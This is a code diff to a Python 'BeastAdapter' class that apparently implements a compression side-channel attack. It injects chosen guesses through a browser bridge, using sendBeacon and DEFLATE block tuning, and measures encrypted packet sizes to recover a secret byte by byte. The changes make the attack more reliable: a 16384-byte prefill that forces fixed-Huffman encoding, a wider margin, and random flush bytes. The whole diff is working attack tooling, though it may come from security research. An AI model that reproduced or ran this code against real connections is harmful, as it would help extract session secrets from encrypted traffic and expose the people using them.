@@ -49,7 +49,7 @@ class BeastAdapter:
         # LZ77-bias that survives averaging across rounds — the fatal
         # mode that a cached flush would cause.
         if cfg.flush_bytes > 0:
-            await self._bridge.inject(_make_flush(cfg))
+            await self._bridge.inject(_make_flush(cfg, cfg.flush_bytes))
         if cfg.settle > 0:
             await asyncio.sleep(cfg.settle)
 
@@ -59,9 +59,17 @@ class BeastAdapter:
         if cfg.settle > 0:
             await asyncio.sleep(cfg.settle)
 
-        # 3. Clear log, send guess, read
+        # 3. Clear log, send guess, read. Optionally prepend a
+        # per-measurement fresh filler to the guess Beacon body: with
+        # enough filler the deflate auto-flush at lit_bufsize (16384
+        # symbols) closes block 1 on the headers + filler-head, leaving
+        # the guess in a much smaller block 2 whose type zlib can pick
+        # independently.
+        body = prefix + candidate + alignment
+        if cfg.guess_prefill_bytes > 0:
+            body = _make_flush(cfg, cfg.guess_prefill_bytes) + body
         self._packet_log.clear()
-        await self._bridge.inject(prefix + candidate + alignment)
+        await self._bridge.inject(body)
         if cfg.settle > 0:
             await asyncio.sleep(cfg.settle)
         return _sum_c2s(
@@ -75,16 +83,18 @@ class BeastAdapter:
             alphabet=[bytes([c]) for c in b"abcdefghijklmnopqrstuvwxyz0123456789"],
             max_length=32,
             terminator=b"\r",
-            min_margin=32,
+            min_margin=64,
             max_rounds=64,
             settle=0.01,
             alignment_mode=AlignmentMode.FULL_SWEEP,
-            # 0..15 (not 0..7) because Firefox's cross-origin sendBeacon
-            # puts the request in a dynamic-Huffman DEFLATE block, where
-            # the 0x80..0x8F alignment bytes cost 9-12 bits rather than
-            # the fixed-Huffman 8. Under 9-bit chars, 0..7 misses residue
-            # 1 mod 8 — a straight 1/8 per-position failure rate.
-            alignment_lengths=list(range(16)),
+            # [0..7] is sufficient because guess_prefill_bytes (below)
+            # forces the guess into a small post-lit_bufsize block that
+            # zlib encodes with fixed Huffman — 8-bit literals, mod-8
+            # alignment residue restored. Without the prefill the guess
+            # packet's HTTP headers skew the block into dynamic Huffman
+            # and alignment bytes cost 9-12 bits; [0..7] would then miss
+            # residue 1 mod 8 for a 1/8 per-position failure rate.
+            alignment_lengths=list(range(8)),
             candidate_elimination=True,
             constant_prefix_trim=True,
             adaptive_alignment=False,
@@ -92,19 +102,17 @@ class BeastAdapter:
             alignment_hint_carryover=False,
             outlier_threshold=32,
             flush_bytes=33000,
-            flush_pool="high_ascii",
+            flush_pool="secrets_random",
             measurement_min_segment_size=100,
             candidate_fork_on_stall=True,
             fork_top_k=5,
             max_fork_depth=2,
+            guess_prefill_bytes=16384,
             label="beast-default",
         )
 
 
-def _make_flush(cfg: AttackConfig) -> bytes:
+def _make_flush(cfg: AttackConfig, size: int) -> bytes:
     if cfg.flush_pool == "high_ascii":
-        return bytes(random.choices(range(0x80, 0x100), k=cfg.flush_bytes))
-    # Defensive fallback; BEAST shouldn't use secrets_random in practice,
-    # but the engine's outlier retry may regenerate with any legitimate
-    # pool setting.
-    return secrets.token_bytes(cfg.flush_bytes)
+        return bytes(random.choices(range(0x80, 0x100), k=size))
+    return secrets.token_bytes(size)
